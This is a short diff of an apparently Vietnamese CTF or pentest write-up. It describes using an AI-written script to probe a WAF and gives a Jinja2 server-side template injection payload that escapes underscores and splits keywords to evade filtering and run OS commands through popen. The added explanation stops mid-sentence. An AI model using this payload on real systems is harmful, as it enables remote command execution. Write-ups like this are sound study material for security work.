@@ -51,9 +51,10 @@ Mình nhờ AI viết script nho nhỏ để check xem WAF chặn gì:
 ![[Pasted image 20261015175816.png]]
 
 Test thêm một lúc thì WAF dường như chỉ chặn ở tầng keyword. Mình exploit thành công sử dụng payload:
-`{{cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('o'+'s')|attr('po'+'pen')('i'+'d')|attr('read')()}}`
+`{{cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('o'+'s')|attr('po'+'pen')('<PAYLOAD>')|attr('read')()}}`
 
-
+Giải thích payload:
+- cycler: Class 
 
 ![[Pasted image 20261015180316.png]]
 
